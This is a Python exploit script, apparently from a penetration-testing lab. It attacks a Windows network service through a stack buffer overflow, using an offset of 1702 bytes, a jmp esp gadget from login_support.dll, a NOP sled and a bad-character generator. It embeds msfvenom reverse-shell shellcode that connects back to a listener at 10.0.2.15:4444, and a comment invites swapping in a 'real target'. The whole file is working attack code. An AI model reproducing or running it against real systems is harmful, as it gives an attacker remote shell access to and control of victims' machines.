import socket
import struct

def conv(address):
    return struct.pack("<I", address)

def generate_badchar():
    badchar_str = b""

    # Badchars causing payload to fail.
    badchar_list = [0x00, 0x0A, 0x0D, 0x2D, 0x2E, 0x2F, 0x46, 0x47, 0x48, 0x59, 0x5E, 0x60, 0xFF]

    # Generate string to test for badchars.
    for i in range(0x00, 0xff + 1):
        if i not in badchar_list:
            badchar_str += struct.pack("B", i)

    # For comparison with mona.py , !mona compare -f "location_of_badchar_bin_file" -a "hex_address_where_payload_is_located"
    with open("badchar_file.bin", "wb+") as bf:
        bf.write(badchar_str)

    return badchar_str

def exploit():
    socket_buf = 4096 # receive buffer 
    target_ip = "10.0.2.22" # Change values according to test machine or real target
    target_port = 2371
    offset = 1702 # Stops at EBP or 4 bytes before EIP

    # msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f py -b '\x00\x0a\x0d\x2d\x2e\x2f\x46\x47\x48\x59\x5e\x60\xff'
    shellcode =  b""
    shellcode += b"\x31\xc9\xb1\x51\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
    shellcode += b"\x13\x9b\xaa\x8e\xf4\x83\xeb\xfc\xe2\xf4\x67\x42\x0c"
    shellcode += b"\xf4\x9b\xaa\xee\x7d\x7e\x9b\x4e\x90\x10\xfa\xbe\x7f"
    shellcode += b"\xc9\xa6\x05\xa6\x8f\x21\xfc\xdc\x94\x1d\xc4\xd2\xaa"
    shellcode += b"\x55\x22\xc8\xfa\xd6\x8c\xd8\xbb\x6b\x41\xf9\x9a\x6d"
    shellcode += b"\x6c\x06\xc9\xfd\x05\xa6\x8b\x21\xc4\xc8\x10\xe6\x9f"
    shellcode += b"\x8c\x78\xe2\x8f\x25\xca\x21\xd7\xd4\x9a\x79\x05\xbd"
    shellcode += b"\x83\x49\xb4\xbd\x10\x9e\x05\xf5\x4d\x9b\x71\x58\x5a"
    shellcode += b"\x65\x83\xf5\x5c\x92\x6e\x81\x6d\xa9\xf3\x0c\xa0\xd7"
    shellcode += b"\xaa\x81\x7f\xf2\x05\xac\xbf\xab\x5d\x92\x10\xa6\xc5"
    shellcode += b"\x7f\xc3\xb6\x8f\x27\x10\xae\x05\xf5\x4b\x23\xca\xd0"
    shellcode += b"\xbf\xf1\xd5\x95\xc2\xf0\xdf\x0b\x7b\xf5\xd1\xae\x10"
    shellcode += b"\xb8\x65\x79\xc6\xc2\xbd\xc6\x9b\xaa\xe6\x83\xe8\x98"
    shellcode += b"\xd1\xa0\xf3\xe6\xf9\xd2\x9c\x55\x5b\x4c\x0b\xab\x8e"
    shellcode += b"\xf4\xb2\x6e\xda\xa4\xf3\x83\x0e\x9f\x9b\x55\x5b\xa4"
    shellcode += b"\xcb\xfa\xde\xb4\xcb\xea\xde\x9c\x71\xa5\x51\x14\x64"
    shellcode += b"\x7f\x19\x9e\x9e\xc2\x84\xf4\x99\xa5\xe6\xf6\x9b\xbb"
    shellcode += b"\xd2\x7d\x7d\xc0\x9e\xa2\xcc\xc2\x17\x51\xef\xcb\x71"
    shellcode += b"\x21\x1e\x6a\xfa\xf8\x64\xe4\x86\x81\x77\xc2\x7e\x41"
    shellcode += b"\x39\xfc\x71\x21\xf3\xc9\xe3\x90\x9b\x23\x6d\xa3\xcc"
    shellcode += b"\xfd\xbf\x02\xf1\xb8\xd7\xa2\x79\x57\xe8\x33\xdf\x8e"
    shellcode += b"\xb2\xf5\x9a\x27\xca\xd0\x8b\x6c\x8e\xb0\xcf\xfa\xd8"
    shellcode += b"\xa2\xcd\xec\xd8\xba\xcd\xfc\xdd\xa2\xf3\xd3\x42\xcb"
    shellcode += b"\x1d\x55\x5b\x7d\x7b\xe4\xd8\xb2\x64\x9a\xe6\xfc\x1c"
    shellcode += b"\xb7\xee\x0b\x4e\x11\x7e\x41\x39\xfc\xe6\x52\x0e\x17"
    shellcode += b"\x13\x0b\x4e\x96\x88\x88\x91\x2a\x75\x14\xee\xaf\x35"
    shellcode += b"\xb3\x88\xd8\xe1\x9e\x9b\xf9\x71\x21"


    # Message=  0x625012b8 : jmp esp |  {PAGE_EXECUTE_READ} [login_support.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\adminuser\Desktop\login_support.dll)
    gadget_jmp_esp = conv(0x625012b8)
    
    # To ensure that when jmp esp is performed.. it will hit nop sled and ends in the shellcode.
    nop_sled = b"\x90" * 32

    # Payload
    buf =  b''
    buf += b"A" * offset
    buf += gadget_jmp_esp
    buf += nop_sled
    buf += shellcode

    # Makes connection to server and sends the payload
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mySock:
        mySock.connect((target_ip, target_port))
        
        mySock.sendall(buf)
        reply = mySock.recv(socket_buf)

        print(reply.decode())

if __name__ == "__main__":
    exploit()